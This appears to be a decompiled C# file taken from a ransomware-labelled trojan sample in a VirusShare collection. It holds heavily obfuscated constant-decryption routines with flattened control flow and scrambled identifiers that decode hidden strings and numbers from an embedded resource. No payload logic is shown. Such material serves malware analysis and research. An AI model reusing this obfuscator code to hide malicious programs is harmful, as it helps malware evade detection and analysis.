// Decompiled with JetBrains decompiler
// Type: P���]�K���
�$W
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D340C4D9-77FF-49DB-A007-50B4002F5AFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-429a36b53420915e57e9034d24b9ce0668b08c5e0e1d3eca43c67980b9dd2198.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class P\uFFFD\uFFFD\uFFFD\u005D\uFFFDK\uFFFD\u0017\uFFFD\uFFFD\u000A\uFFFD\u0024W
{
  static object \uFFFD\u005C\uFFFD\u001EL\uFFFD\u000B\uFFFD\u000F\u0008\uFFFD\uFFFD\uFFFD\u0019\u007B\u0013(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = --38 + -6 - 9;
    uint num2;
    object obj;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      int num6;
      do
      {
        uint num7;
        uint num8;
        uint num9;
        int num10;
        do
        {
          switch (num1)
          {
            case 1:
              num8 = 1U;
              num1 = 7 - (-3 - -~4) - 2;
              continue;
            case 2:
              num4 = 1596239922U ^ num5;
              num1 = ~-~-17;
              continue;
            case 3:
              num4 += (uint) (((int) num3 | (int) num9) ^ 949018026);
              num1 = 5 - (-4 - (3 - -(5 - 7)));
              continue;
            case 4:
              num1 = ~---8;
              continue;
            case 5:
              num2 = num4 ^ b;
              num1 = --10 - ~9 - 3;
              continue;
            case 6:
              if (num7 >= 16U && num7 < 32U)
              {
                num3 ^= (uint) (((int) num4 & 16711935) << 8 ^ ((int) ((num4 & 16776960U) >> 8) | ~(int) num4 & (int) ushort.MaxValue));
                num9 += num4 * num8 % 32U;
                num4 |= (uint) ((int) num3 + ~(int) num9 & 949018026);
                num1 = 36 + ~-6 + -8 - 9;
                continue;
              }
              goto case 14;
            case 7:
              ++num8;
              goto case 13;
            case 8:
              if (num7 < 48U)
              {
                num3 += (uint) (((int) num4 & (int) byte.MaxValue | (int) ((num4 & 16711680U) >> 16)) + (~(int) num4 & (int) byte.MaxValue));
                num1 = ~~--19;
                continue;
              }
              goto label_30;
            case 9:
              num9 ^= (uint) ((int) num4 * (int) num8 + 1) % 16U;
              num1 = -8 - ~6 + 4;
              continue;
            case 10:
              num1 = --6 - (7 - 8);
              continue;
            case 11:
              num9 = 1757617707U;
              num1 = -~~-1;
              continue;
            case 12:
              int num11 = (int) num7;
              num1 = ~(-8 - (5 - 4 + (4 + 4))) - 9;
              if ((uint) num11 < 64U)
              {
                num1 = 2 - -7 - -6 + 7;
                continue;
              }
              continue;
            case 13:
              int num12 = (int) num8;
              num1 = 8 - -9 - ~4 - 6;
              if ((uint) num12 > 64U)
              {
                num1 = 9 - 4;
                continue;
              }
              continue;
            case 14:
              num10 = (int) num7;
              num1 = 2 - ~~-18;
              continue;
            case 15:
              goto label_23;
            case 16:
              goto label_24;
            case 17:
              goto label_26;
            case 18:
              goto label_28;
            case 19:
              goto label_29;
            case 20:
              goto label_30;
            case 21:
              goto label_32;
            case 22:
              goto label_33;
            case 23:
              goto label_34;
            case 24:
              goto label_35;
            default:
              if (num7 < 16U)
              {
                num3 |= (uint) ((int) ((num4 & 65280U) >> 8) & (int) ((num4 & 16711680U) >> 16) ^ ~(int) num4 & (int) byte.MaxValue);
                num1 = 1 - ~~3 + (5 + 2) + 4;
                continue;
              }
              goto case 6;
          }
        }
        while ((uint) num10 < 32U);
        num1 = ~-10 - (7 - 6);
        continue;
label_23:
        num3 = 1983177875U;
        num1 = --20 - 9;
        continue;
label_24:
        num4 = (uint) (((int) num4 & 16777215) << 8) | (num4 & 4278190080U) >> 24;
        num7 = (num4 & (uint) byte.MaxValue) % 64U;
        int num13 = (int) num7;
        num1 = -(~~9 - 3 - (9 + 3));
        if ((uint) num13 >= 0U)
        {
          num1 = 4 + (9 + 6) - 19;
          continue;
        }
        continue;
label_26:
        if (!\u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ.TryGetValue(num2, out obj))
        {
          num1 = 3 - (-31 - ~(9 + 3));
          continue;
        }
        goto label_64;
label_28:
        num9 += (num4 ^ num8 - 1U) % num7;
        num4 -= (uint) (~((int) num3 ^ (int) num9) + 949018026);
        num1 = ~~--7;
        continue;
label_29:
        num9 -= (uint) ~((int) num4 + (int) num7) % 48U;
        num4 ^= num3 % num9 | 949018026U;
        num1 = ~(~8 + 4);
        continue;
label_30:
        num6 = (int) num7;
        num1 = 2 - (-21 + (7 + 9));
      }
      while ((uint) num6 < 48U);
      num1 = -~(8 + (9 + 2 + ~7));
      continue;
label_33:
      num3 ^= (uint) (((int) ((num4 & 16711680U) >> 16) | ~((int) num4 & (int) byte.MaxValue)) * (~(int) num4 & 16711680));
      num1 = ~---19;
      continue;
label_34:
      num5 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
      num1 = -(--2 + ~3);
      continue;
label_35:
      num1 = ~12 + (9 + 8) + 3;
    }
label_32:
    byte[] bytes;
    byte num14;
    lock (\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ)
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ);
      int num15 = 5 - ~~4;
      while (true)
      {
        switch (num15)
        {
          case 1:
            binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
            num15 = -~10 - 9;
            continue;
          case 2:
            num14 = binaryReader.ReadByte();
            num15 = -~2 - 3;
            continue;
          default:
            goto label_38;
        }
      }
label_38:
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876214 ^ currentMethod.MetadataToken);
    int num16 = -~(6 + (4 - 4 + (7 - 2)));
    while (true)
    {
      uint num17;
      ushort num18;
      int num19;
      do
      {
        int index;
        ushort num20;
        ushort num21;
        int num22;
        do
        {
          switch (num16)
          {
            case 1:
              obj = (object) BitConverter.ToDouble(bytes, 0);
              goto label_52;
            case 2:
              goto label_49;
            case 3:
              goto label_50;
            case 4:
              if (index >= bytes.Length)
              {
                if (num14 != (byte) 247)
                {
                  num22 = (int) num14;
                  num16 = ~-10 + ~2;
                  continue;
                }
                goto label_62;
              }
              else
                goto label_51;
            case 5:
              goto label_52;
            case 6:
              switch (num14)
              {
                case 4:
                  num16 = -~(18 - (6 + 4 - 5));
                  continue;
                case 40:
                  goto label_54;
                default:
                  goto label_66;
              }
            case 7:
              goto label_55;
            case 8:
              goto label_56;
            case 9:
              goto label_57;
            case 10:
              goto label_58;
            case 11:
              num21 = (ushort) ((num17 * (uint) num21 + (uint) num20) % 65536U);
              ++index;
              goto case 4;
            case 12:
              goto label_63;
            case 13:
              goto label_64;
            case 14:
              goto label_65;
            case 15:
              goto label_68;
            default:
              obj = (object) BitConverter.ToInt32(bytes, 0);
              goto label_52;
          }
        }
        while (num22 != 99);
        num16 = -(-17 - ~(2 + 9) - 2);
        continue;
label_49:
        index = 0;
        num16 = 6 + 6 + (3 - 6) - 5;
        continue;
label_50:
        num20 = (ushort) (num17 & (uint) ushort.MaxValue);
        ushort num23 = num20;
        num16 = ~~(-8 - ~7 - -9);
        continue;
label_51:
        bytes[index] ^= (byte) ((num17 * (uint) num23 + (uint) num21) % 256U ^ (uint) numArray[index % 8]);
        num23 = (ushort) ((num17 * (uint) num23 + (uint) num18) % 65536U);
        num16 = ~---12;
        continue;
label_52:
        \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ[num2] = obj;
        num16 = 2 + (8 - 8 - (2 + 2)) - -6 + 9;
        continue;
label_54:
        num16 = 7 - -~6;
        continue;
label_55:
        obj = (object) BitConverter.ToSingle(bytes, 0);
        num16 = -~5 + 2;
        continue;
label_56:
        num16 = -(7 - ~-13);
        continue;
label_57:
        num21 = num18;
        num16 = 2 + (6 - 9 - (3 - 6)) + (4 - 4);
        continue;
label_58:
        obj = (object) Encoding.UTF8.GetString(bytes);
        num16 = ~(~9 + (4 + 2) - -3 - (8 - 3));
        continue;
label_62:
        num16 = -(--4 + (2 - 7));
        continue;
label_63:
        num17 = (uint) (((int) num2 + (int) num14) * 1152257809);
        num16 = ~~24 - 9;
        continue;
label_65:
        obj = (object) BitConverter.ToInt64(bytes, 0);
        goto label_52;
label_66:
        num19 = (int) num14;
        num16 = 5 - 2 - (-25 - (~9 + (2 - 6))) - 9;
      }
      while (num19 != 95);
      num16 = -(-11 - ~(3 + 4) - (4 + 3));
      continue;
label_68:
      num18 = (ushort) (num17 >> 16);
      num16 = -~(-10 - -(8 + 4));
    }
label_64:
    return obj;
  }

  static object \uFFFD\uFFFD\uFFFD\u001EZ\u000B\uFFFD\u001CrO\uFFFDL\u005D\uFFFD\u0020\uFFFD(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = ~(-5 - 3) - 7;
    uint num3;
    object obj;
    Stream 㬓儴ᴟ嚟矶殷ﮊ;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        int num10;
        do
        {
          switch (num2)
          {
            case 1:
              num5 += (num4 ^ num6 - 1U) % num7;
              num4 -= (uint) (~((int) num8 ^ (int) num5) + 2044143532);
              num2 = ~~(3 - (~4 - (5 - 2)));
              continue;
            case 2:
              if (num7 < 48U)
              {
                num8 += (uint) (((int) num4 & (int) byte.MaxValue | (int) ((num4 & 16711680U) >> 16)) + (~(int) num4 & (int) byte.MaxValue));
                num5 -= (uint) ~((int) num4 + (int) num7) % 48U;
                num4 ^= num8 % num5 | 2044143532U;
                num2 = ~(4 - (7 + 8 - 6) + -7);
                continue;
              }
              goto case 6;
            case 3:
              if (!\u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ.TryGetValue(num3, out obj))
              {
                num2 = -~16 - 8;
                continue;
              }
              goto label_43;
            case 4:
            case 10:
              if (num6 > 64U)
              {
                num3 = num4 ^ b;
                num2 = 15 - -~5 - 6;
                continue;
              }
              goto label_17;
            case 5:
              num5 ^= (uint) ((int) num4 * (int) num6 + 1) % 16U;
              num2 = -(-9 - (7 - (3 + 5)) - (3 - 4));
              continue;
            case 6:
              if (num7 >= 48U)
              {
                num10 = (int) num7;
                num2 = --13 - 2;
                continue;
              }
              goto label_18;
            case 7:
              goto label_14;
            case 8:
              goto label_15;
            case 9:
              goto label_16;
            case 11:
            case 12:
              goto label_18;
            case 13:
              goto label_23;
            case 14:
              goto label_25;
            case 15:
              goto label_26;
            case 16:
              goto label_28;
            case 17:
              goto label_29;
            case 18:
              goto label_30;
            default:
              num4 = 821111637U ^ num1;
              num2 = --(9 + (9 - (7 - 3)));
              continue;
          }
        }
        while ((uint) num10 >= 64U);
        num2 = 4 - -(~-4 - -1);
        continue;
label_14:
        num4 += (uint) (((int) num8 | (int) num5) ^ 2044143532);
        num2 = ~~17 - 5;
        continue;
label_15:
        num8 ^= (uint) (((int) ((num4 & 16711680U) >> 16) | ~((int) num4 & (int) byte.MaxValue)) * (~(int) num4 & 16711680));
        num2 = ~~(6 - (-7 + (9 + 3)));
        continue;
label_16:
        Monitor.Enter((object) (㬓儴ᴟ嚟矶殷ﮊ = \u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ));
        goto label_31;
label_17:
        num4 = (uint) (((int) num4 & 16777215) << 8) | (num4 & 4278190080U) >> 24;
        num2 = ~~(33 + -(9 + 6));
        continue;
label_18:
        ++num6;
        num2 = ~1 + (5 + 6) - 5;
        continue;
label_19:
        if (num7 >= 16U && num7 < 32U)
        {
          num8 ^= (uint) (((int) num4 & 16711935) << 8 ^ ((int) ((num4 & 16776960U) >> 8) | ~(int) num4 & (int) ushort.MaxValue));
          num5 += num4 * num6 % 32U;
          num4 |= (uint) ((int) num8 + ~(int) num5 & 2044143532);
          goto label_18;
        }
        else
        {
          num9 = (int) num7;
          num2 = ~(5 - 6) + 6;
          continue;
        }
label_23:
        if (num7 < 0U)
          goto label_19;
        else
          goto label_24;
label_26:
        if (num7 >= 16U)
          goto label_19;
        else
          goto label_27;
      }
      while ((uint) num9 < 32U);
      num2 = 3 - (~3 - ~4);
      continue;
label_24:
      num2 = ~-12 - ~9 - 6;
      continue;
label_25:
      num8 = 2002728874U;
      num5 = 1647617424U;
      num2 = -~~-17;
      continue;
label_27:
      num2 = ~-(20 + (-4 - (6 - 7)));
      continue;
label_28:
      num8 |= (uint) ((int) ((num4 & 65280U) >> 8) & (int) ((num4 & 16711680U) >> 16) ^ ~(int) num4 & (int) byte.MaxValue);
      num2 = -(~-2 - (2 + 4));
      continue;
label_29:
      num6 = 1U;
      num2 = ~~(13 - 3);
      continue;
label_30:
      num7 = (num4 & (uint) byte.MaxValue) % 64U;
      num2 = 3 - -(4 + 8) - ~3 - 6;
    }
label_31:
    byte num11;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ);
      binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
      int num12 = ----1;
      while (true)
      {
        switch (num12)
        {
          case 1:
            num11 = binaryReader.ReadByte();
            bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
            num12 = ~(--8 + ~8);
            continue;
          default:
            goto label_35;
        }
      }
    }
    finally
    {
      Monitor.Exit((object) 㬓儴ᴟ嚟矶殷ﮊ);
    }
label_35:
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876217 ^ currentMethod.MetadataToken);
    uint num13 = (uint) (((int) num3 + (int) num11) * 1152257809);
    ushort num14 = (ushort) (num13 >> 16);
    int num15 = 5 - ~(12 - (3 + 6 + 4));
    while (true)
    {
      int index;
      ushort num16;
      int num17;
      do
      {
        int num18;
        do
        {
          int num19;
          do
          {
            switch (num15)
            {
              case 1:
              case 6:
              case 13:
                goto label_42;
              case 2:
                num19 = (int) num11;
                num15 = --7 - ~6 - 3;
                continue;
              case 3:
                goto label_40;
              case 4:
                goto label_41;
              case 5:
                goto label_44;
              case 7:
                goto label_45;
              case 8:
                goto label_48;
              case 9:
                goto label_47;
              case 10:
                goto label_50;
              case 11:
                goto label_51;
              case 12:
                goto label_53;
              case 14:
                goto label_57;
              case 15:
                goto label_58;
              case 16:
                goto label_59;
              default:
                obj = (object) BitConverter.ToSingle(bytes, 0);
                num15 = -(-(9 - 7) - -3 - (6 + 8));
                continue;
            }
          }
          while (num19 != 4);
          num15 = 5 - ---5;
          continue;
label_40:
          ushort num20;
          ushort num21 = num20;
          num15 = 11 - -(6 + 3) - (6 - 4) - 3;
          continue;
label_41:
          obj = (object) Encoding.UTF8.GetString(bytes);
label_42:
          \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ[num3] = obj;
          goto label_43;
label_44:
          num20 = (ushort) (num13 & (uint) ushort.MaxValue);
          num15 = -(5 + 5) - -13;
          continue;
label_45:
          obj = (object) BitConverter.ToInt32(bytes, 0);
          goto label_42;
label_47:
          num21 = (ushort) ((num13 * (uint) num21 + (uint) num14) % 65536U);
          num16 = (ushort) ((num13 * (uint) num16 + (uint) num20) % 65536U);
          ++index;
label_48:
          if (index < bytes.Length)
          {
            bytes[index] ^= (byte) ((num13 * (uint) num21 + (uint) num16) % 256U ^ (uint) numArray[index % 8]);
            num15 = ~~14 - 5;
            continue;
          }
          num15 = ~(-13 - -~3) - 4;
          continue;
label_50:
          obj = (object) BitConverter.ToInt64(bytes, 0);
          num15 = ~~(12 - (8 + 6 + ~2));
          continue;
label_51:
          if (num11 == (byte) 95)
          {
            num15 = 5 - (~1 + 3);
            continue;
          }
          goto label_42;
label_53:
          num18 = (int) num11;
          num15 = ~(--1 - (9 + 9));
        }
        while (num18 != 247);
        num15 = --9 + (3 + 8) - 6;
        continue;
label_59:
        if (num11 != (byte) 99)
        {
          num17 = (int) num11;
          num15 = ~-9 - 6;
        }
        else
          goto label_60;
      }
      while (num17 != 40);
      num15 = ~(-11 - ~~2) - 5;
      continue;
label_57:
      obj = (object) BitConverter.ToDouble(bytes, 0);
      num15 = ~(-1 - (8 - 2));
      continue;
label_58:
      num16 = num14;
      index = 0;
      num15 = 2 - (~3 - ~-3);
      continue;
label_60:
      num15 = -(~-3 + -2);
    }
label_43:
    return obj;
  }

  static object \u001D0O\u0023\uFFFD\uFFFD\u0019E\u000A63\u002A\u007D\uFFFD\uFFFD\u0016(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = -~17 - 2;
    uint num3;
    object obj;
    Stream 㬓儴ᴟ嚟矶殷ﮊ;
    while (true)
    {
      int num4;
      do
      {
        uint num5;
        int num6;
        do
        {
          uint num7;
          uint num8;
          uint num9;
          uint num10;
          switch (num2)
          {
            case 1:
              if (num5 >= 16U)
              {
                num2 = -(~19 + (9 - 8));
                continue;
              }
              break;
            case 2:
              num8 ^= (uint) (((int) ((num7 & 16711680U) >> 16) | ~((int) num7 & (int) byte.MaxValue)) * (~(int) num7 & 16711680));
              num2 = ~---18;
              continue;
            case 3:
              num7 += (uint) (((int) num8 | (int) num9) ^ 1070653104);
              num2 = --(10 + 2);
              continue;
            case 4:
              num2 = -(~(9 + 6) - 3) - 7;
              continue;
            case 5:
              if (!\u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ.TryGetValue(num3, out obj))
              {
                num2 = 7 - (-6 + (4 - 6));
                continue;
              }
              goto label_53;
            case 6:
              num8 |= (uint) ((int) ((num7 & 65280U) >> 8) & (int) ((num7 & 16711680U) >> 16) ^ ~(int) num7 & (int) byte.MaxValue);
              num2 = 29 - ~~7 - (7 - 2) - 3;
              continue;
            case 7:
              int num11 = (int) num5;
              num2 = -(-6 - (6 + 9));
              if ((uint) num11 < 48U)
              {
                num2 = -7 - ~20 - 3;
                continue;
              }
              continue;
            case 8:
              num5 = (num7 & (uint) byte.MaxValue) % 64U;
              if (num5 >= 0U)
              {
                int num12 = (int) num5;
                num2 = 16 + -(9 + 7) - (7 - 8);
                if ((uint) num12 < 16U)
                {
                  num2 = 1 + -~9 - 2 - 3;
                  continue;
                }
                continue;
              }
              goto case 1;
            case 9:
              num8 = 1016555972U;
              num9 = 1870806336U;
              num10 = 1U;
              num2 = -(-18 - (3 - (9 - 6)) - (5 - 5));
              continue;
            case 10:
              num7 = (uint) (((int) num7 & 16777215) << 8) | (num7 & 4278190080U) >> 24;
              num2 = 6 + 4 - ~-3;
              continue;
            case 11:
              num8 += (uint) (((int) num7 & (int) byte.MaxValue | (int) ((num7 & 16711680U) >> 16)) + (~(int) num7 & (int) byte.MaxValue));
              num9 -= (uint) ~((int) num7 + (int) num5) % 48U;
              num2 = -~(8 - 9);
              continue;
            case 12:
            case 20:
              ++num10;
              num2 = 4 - ~(14 + (2 + 5 + ~7));
              continue;
            case 13:
              num9 += num7 * num10 % 32U;
              num7 |= (uint) ((int) num8 + ~(int) num9 & 1070653104);
              num2 = 2 - -18;
              continue;
            case 14:
              num9 ^= (uint) ((int) num7 * (int) num10 + 1) % 16U;
              num2 = 7 + 2 - ~-9 + 2;
              continue;
            case 15:
              Monitor.Enter((object) (㬓儴ᴟ嚟矶殷ﮊ = \u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ));
              goto label_34;
            case 16:
              num7 = 268781988U ^ num1;
              num2 = --12 + -3;
              continue;
            case 17:
              num9 += (num7 ^ num10 - 1U) % num5;
              num7 -= (uint) (~((int) num8 ^ (int) num9) + 1070653104);
              num2 = --1 - ~4 + 6;
              continue;
            case 18:
              if (num10 > 64U)
              {
                num3 = num7 ^ b;
                num2 = ~(6 - (-4 + (8 + 5)) + -3);
                continue;
              }
              goto case 10;
            case 19:
              if (num5 < 32U)
              {
                num8 ^= (uint) (((int) num7 & 16711935) << 8 ^ ((int) ((num7 & 16776960U) >> 8) | ~(int) num7 & (int) ushort.MaxValue));
                num2 = ~(-18 - (7 - 5 - 9) - (9 - 6));
                continue;
              }
              break;
            case 21:
              if (num5 < 48U)
                goto case 12;
              else
                goto label_32;
            default:
              num7 ^= num8 % num9 | 1070653104U;
              num2 = ~(~-5 - (7 + 2));
              continue;
          }
          num6 = (int) num5;
          num2 = -~24 - 4;
        }
        while ((uint) num6 < 32U);
        num2 = -(-17 - (~2 - (7 + 9)) + -9);
        continue;
label_32:
        num4 = (int) num5;
        num2 = --17 - (3 + 5) + 3;
      }
      while ((uint) num4 >= 64U);
      num2 = -(-2 - --7) - 7;
    }
label_34:
    byte num13;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ);
      binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
      num13 = binaryReader.ReadByte();
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
      switch (-~(-19 - -(9 + 9)))
      {
      }
    }
    finally
    {
      Monitor.Exit((object) 㬓儴ᴟ嚟矶殷ﮊ);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876216 ^ currentMethod.MetadataToken);
    int num14 = ~(3 - --5);
    while (true)
    {
      uint num15;
      ushort num16;
      ushort num17;
      ushort num18;
      ushort num19;
      int index;
      int num20;
      int length;
      do
      {
        int num21;
        do
        {
          switch (num14)
          {
            case 1:
              num15 = (uint) (((int) num3 + (int) num13) * 1152257809);
              num16 = (ushort) (num15 >> 16);
              num17 = (ushort) (num15 & (uint) ushort.MaxValue);
              num14 = ~(-23 - (5 - 5 - (6 - 3)) - ~9);
              continue;
            case 2:
              if (num13 == (byte) 40)
              {
                obj = (object) BitConverter.ToInt32(bytes, 0);
                num14 = --(-(2 - 3) - -7);
                continue;
              }
              goto case 10;
            case 3:
              num21 = (int) num13;
              num14 = -2 - -7 - 3;
              continue;
            case 4:
              if (num13 != (byte) 247)
                goto case 3;
              else
                goto label_46;
            case 5:
              goto label_47;
            case 6:
              goto label_50;
            case 7:
              goto label_51;
            case 9:
              goto label_54;
            case 10:
              if (num13 != (byte) 4)
              {
                if (num13 == (byte) 95)
                {
                  obj = (object) Encoding.UTF8.GetString(bytes);
                  num14 = 4 + 2 + 3 - 1;
                  continue;
                }
                goto label_52;
              }
              else
                goto label_56;
            case 11:
              goto label_48;
            case 12:
              goto label_57;
            case 13:
              goto label_58;
            default:
              goto label_52;
          }
        }
        while (num21 != 99);
        num14 = ~(16 + (6 - 7 - (6 + 8)) - (6 + 2));
        continue;
label_46:
        obj = (object) BitConverter.ToDouble(bytes, 0);
        num14 = -~--7;
        continue;
label_47:
        num18 = (ushort) ((num15 * (uint) num18 + (uint) num16) % 65536U);
        num19 = (ushort) ((num15 * (uint) num19 + (uint) num17) % 65536U);
        ++index;
label_48:
        num20 = index;
        length = bytes.Length;
        num14 = --~-13;
      }
      while (num20 < length);
      num14 = -7 - ~(3 - 6) + 6 + 7;
      continue;
label_50:
      obj = (object) BitConverter.ToSingle(bytes, 0);
      num14 = -~~-8;
      continue;
label_51:
      index = 0;
      num14 = ----11;
      continue;
label_54:
      num18 = num17;
      num14 = -~~-13;
      continue;
label_56:
      obj = (object) BitConverter.ToInt64(bytes, 0);
      num14 = -18 - ~9 + 8;
      continue;
label_57:
      bytes[index] ^= (byte) ((num15 * (uint) num18 + (uint) num19) % 256U ^ (uint) numArray[index % 8]);
      num14 = ~-10 - 4;
      continue;
label_58:
      num19 = num16;
      num14 = --9 - 2;
    }
label_52:
    \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ[num3] = obj;
label_53:
    return obj;
  }
}
